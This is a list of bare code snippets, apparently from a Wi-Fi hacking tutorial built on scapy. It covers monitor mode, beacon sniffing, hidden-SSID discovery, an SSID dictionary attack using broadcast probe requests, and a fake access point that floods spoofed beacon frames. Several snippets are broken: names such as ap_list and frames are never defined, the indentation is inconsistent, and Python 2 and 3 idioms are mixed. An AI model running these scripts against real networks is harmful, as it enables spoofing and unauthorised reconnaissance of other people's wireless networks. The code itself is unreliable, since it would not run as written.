["```py\nairmon-ng start wlan0  \n```", "```py\nifconfig wlan0 down\niw dev wlan0 set type monitor\nifconfig wlan0 up  \n```", "```py\nifconfig wlan0 down\niw dev wlan1 set type managed\nifconfig wlan0 up  \n```", "```py\nsudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport\n\n```", "```py\nairport en0 channel 7  \n```", "```py\nsudo airport en0 sniff  \n```", "```py\nfrom scapy.all import *\n```", "```py\naccess_points = []    \n```", "```py\ndef parsePacket(pkt):\n    if pkt.haslayer(Dot11):\n        print(pkt.show())  \n```", "```py\ndef parsePacket(pkt):\n    if pkt.haslayer(Dot11):\n        if pkt.type == 0 and pkt.subtype == 8:\n            if pkt.addr2 not in ap_list:\n               print(pkt.addr2)\n```", "```py\nsniff(iface='en0', prn=parsePacket, count=10, timeout=3, store=0)  \n```", "```py\n$ sudo python3 Wi-Fi-sniff.py  \n```", "```py\nfrom scapy.all import *   \n```", "```py\ndef parseSSID(pkt):\n    if pkt.haslayer(Dot11):\n        print(pkt.show())\n        if pkt.type == 0 and pkt.subtype == 8:\n                ap_list.append(pkt.addr2)\n                print(\"SSID:\" + pkt.info)\n```", "```py\nsniff(iface='en0', prn=ssid, count=10, timeout=3, store=0)  \n```", "```py\n$ sudo python3 sniff-ssid.py  \n```", "```py\nfrom scapy.all import *\nhiddenSSIDs = dict()  \n```", "```py\ndef parseSSID(pkt):\nif pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):\n   if not hiddenSSIDs.has_key(pkt[Dot11].addr3):\n         ssid       = pkt[Dot11Elt].info\n         bssid      = pkt[Dot11].addr3\n         channel    = int( ord(pkt[Dot11Elt:3].info))\n         capability = pkt.sprintf(\"{Dot11Beacon%Dot11Beacon.cap%}\\{Dot11ProbeResp:%Dot11ProbeResp.cap%}\")\n    if re.search(\"privacy\", capability): \n              encrypted = 'Y'\n   else: \n              encrypted  = 'N'\n    hiddenSSIDs[pkt[Dot11].addr3] =[encrypted, ssid, bssid, channel] \n          print (hiddenSSIDs)  \n```", "```py\nsniff(iface='wlan0', prn=parseSSID, count=10, timeout=3, store=0)    \n```", "```py\nsudo sniff-hidden-ssid.py    \n```", "```py\nfrom scapy.all import *\nsenderMac = \"aa:aa:aa:aa:aa:aa\"\nbroadcastMac = \"ff:ff:ff:ff:ff:ff\"  \n```", "```py\nfor ssid in open('ssidList.txt', 'r').readlines():\n     pkt = RadioTap()/Dot11(type = 0, subtype = 4 ,addr1 = broadcastMac, addr2 = senderMac, addr3 = broadcastMac)/Dot11ProbeReq()/Dot11Elt(ID=0, info =ssid.strip()) / Dot11Elt(ID=1, info = \"\\x02\\x04\\x0b\\x16\") / Dot11Elt(ID=3, info=\"\\x08\")\n     print (\"Checking ssid:\" + ssid)\n     print(pkt.show())\n     sendp (pkt, iface =\"en0\", count=1)\n```", "```py\nsudo python3  dictionary-attack-ssid.py  \n```", "```py\nfrom scapy.all import *\nimport random  \n```", "```py\nssid = \"fakeap\" \niface = \"en0\"  \n```", "```py\ndot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=str(RandMAC()), addr3=str(RandMAC()))\ndot11beacon = Dot11Beacon(cap='ESS+privacy')\ndot11essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))\n rsn = Dot11Elt(ID='RSNinfo', info=(\n    '\\x01\\x00'                 #For RSN Version 1\n    '\\x00\\x0f\\xac\\x02'         #Group Cipher Suite : 00-0f-ac TKIP\n    '\\x02\\x00'                 #2 Pairwise Cipher Suites (next two lines)\n    '\\x00\\x0f\\xac\\x04'         #AES Cipher\n    '\\x00\\x0f\\xac\\x02'         #TKIP Cipher\n    '\\x01\\x00'                 #1 Authentication Key Managment Suite (line below)\n    '\\x00\\x0f\\xac\\x02'         #Pre-Shared Key\n    '\\x00\\x00'))               #RSN Capabilities (no extra capabilities)   \nframe = RadioTap()/dot11/dot11beacon/dot11essid/rsn\n```", "```py\nsendp(frame, iface=iface, inter=0.0100 if len(frames)<10 else 0, loop=1)  \n```", "```py\nsudo python3 fake-access-point.py  \n```"]